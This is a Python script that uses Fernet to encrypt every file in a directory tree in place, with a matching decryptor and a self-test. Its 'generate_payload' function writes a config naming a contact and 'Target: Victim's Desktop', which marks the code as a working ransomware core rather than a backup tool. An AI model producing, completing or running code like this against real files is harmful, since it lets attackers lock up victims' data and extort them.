#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet
from pathlib import Path

def generate_key():
    """Generate a Fernet encryption key"""
    return Fernet.generate_key()

def save_key(key, filename='secret.key'):
    """Save the encryption key to a file"""
    script_dir = os.path.dirname(os.path.abspath(__file__))
    key_path = os.path.join(script_dir, filename)

    with open(key_path, 'wb') as key_file:
        key_file.write(key)

    return key_path

def load_key(filename='secret.key'):
    """Load the encryption key from a file"""
    with open(filename, 'rb') as key_file:
        return key_file.read()

def encrypt_file(filepath, key):
    """Encrypt a single file"""
    fernet = Fernet(key)

    with open(filepath, 'rb') as file:
        original_data = file.read()

    encrypted_data = fernet.encrypt(original_data)

    with open(filepath, 'wb') as file:
        file.write(encrypted_data)

def decrypt_file(filepath, key):
    """Decrypt a single file"""
    fernet = Fernet(key)

    with open(filepath, 'rb') as file:
        encrypted_data = file.read()

    try:
        decrypted_data = fernet.decrypt(encrypted_data)

        with open(filepath, 'wb') as file:
            file.write(decrypted_data)
        return True
    except Exception:
        return False

def encrypt_directory(directory_path, key):
    """Recursively encrypt all files in a directory"""
    encrypted_count = 0

    for root, dirs, files in os.walk(directory_path):
        for file in files:
            filepath = os.path.join(root, file)
            try:
                encrypt_file(filepath, key)
                encrypted_count += 1
            except Exception as e:
                print(f"Failed to encrypt {filepath}: {e}")

    return encrypted_count

def decrypt_directory(directory_path, key):
    """Recursively decrypt all files in a directory"""
    decrypted_count = 0

    for root, dirs, files in os.walk(directory_path):
        for file in files:
            filepath = os.path.join(root, file)
            try:
                if decrypt_file(filepath, key):
                    decrypted_count += 1
            except Exception as e:
                print(f"Failed to decrypt {filepath}: {e}")

    return decrypted_count

def generate_payload(contact_info):
    """Generate encryption key and save payload configuration"""
    key = generate_key()
    key_path = save_key(key)

    config_path = os.path.join(os.path.dirname(key_path), 'payload_config.txt')
    with open(config_path, 'w') as f:
        f.write(f"Contact: {contact_info}\n")
        f.write(f"Key Location: {key_path}\n")
        f.write(f"Target: Victim's Desktop\n")

    return key_path

def test_encryption():
    """Test encryption/decryption on a sample file"""
    test_dir = Path('test_encryption')
    test_dir.mkdir(exist_ok=True)

    test_file = test_dir / 'test.txt'
    test_file.write_text('This is a test file for encryption')

    key = generate_key()

    print("Original content:", test_file.read_text())

    encrypt_file(str(test_file), key)
    print("Encrypted content:", test_file.read_bytes()[:50])

    decrypt_file(str(test_file), key)
    print("Decrypted content:", test_file.read_text())

    test_file.unlink()
    test_dir.rmdir()
